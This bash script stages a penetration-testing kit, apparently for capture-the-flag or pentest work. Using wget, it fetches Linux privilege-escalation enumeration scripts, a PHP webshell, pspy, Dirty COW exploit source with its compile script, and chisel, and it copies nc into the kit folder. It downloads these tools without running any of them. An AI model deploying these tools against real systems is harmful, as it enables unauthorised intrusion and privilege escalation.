#!/bin/bash
# coding:UTF-8
apt-get install rlwrap
mkdir ALL
cd ALL
wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O linenumplus.sh
wget "https://raw.githubusercontent.com/Adlemann/linPE/master/linpe.sh" -O linpe.sh
wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
wget "https://raw.githubusercontent.com/Arr0way/linux-local-enumeration-script/master/linux-local-enum.sh" -O coffee.sh
wget "https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php" -O webshell.php
wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32" -O pspy32
wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" -O pspy64
wget "https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/compile.sh" -O naughtycowcompile.sh
wget "https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/naughtyc0w.c" -O naughthycow.c
wget "https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_linux_amd64.gz" -O chisel_1.7.2_linux_amd64.gz
gzip -d chisel_1.7.2_linux_amd64.gz
mv chisel_1.7.2_linux_amd64 chisel
cp /usr/bin/nc ./
cd ..
echo "-----------------------------------"
echo "All Done!! - Downloads completed..."
echo "-----------------------------------"
#eof
